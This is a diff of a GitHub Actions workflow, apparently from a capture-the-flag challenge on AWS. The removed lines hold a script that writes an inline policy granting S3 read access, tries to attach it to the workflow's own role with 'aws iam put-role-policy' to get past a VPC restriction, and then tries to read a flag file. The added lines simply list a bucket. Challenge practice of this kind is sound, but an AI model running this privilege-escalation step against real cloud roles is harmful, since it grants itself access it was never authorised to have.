@@ -1,4 +1,4 @@
-name: Challenge IAM Privilege Escalation
+name: Challenge Auth Final Listing
 on: [push]
 
 jobs:
@@ -17,26 +17,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Bypass VPC Restriction via Inline Policy
+      - name: List Files to Reveal Flag
         run: |
-          echo "=== Attacking IAM Policy Restrictions ==="
-          
-          # יצירת פוליסי inline חדש שנותן הרשאה מלאה ל-S3 ללא הגבלת VPC
-          cat << 'POLICY_EOF' > bypass.json
-          {
-              "Version": "2012-10-17",
-              "Statement": [
-                  {
-                      "Effect": "Allow",
-                      "Action": "s3:GetObject",
-                      "Resource": "arn:aws:s3:::codec4f26c862a321ef5/*"
-                  }
-              ]
-          }
-          POLICY_EOF
-          
-          # ניסיון להזריק את הפוליסי ישירות ל-Role הנוכחי שלנו
-          aws iam put-role-policy --role-name cicdRole --policy-name VPCOverridePolicy --policy-document file://bypass.json || true
-          
-          echo "=== Attempting to Read Flag block-free ==="
-          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "Privilege escalation failed."
+          echo "=== Listing Public Bucket Files ==="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/
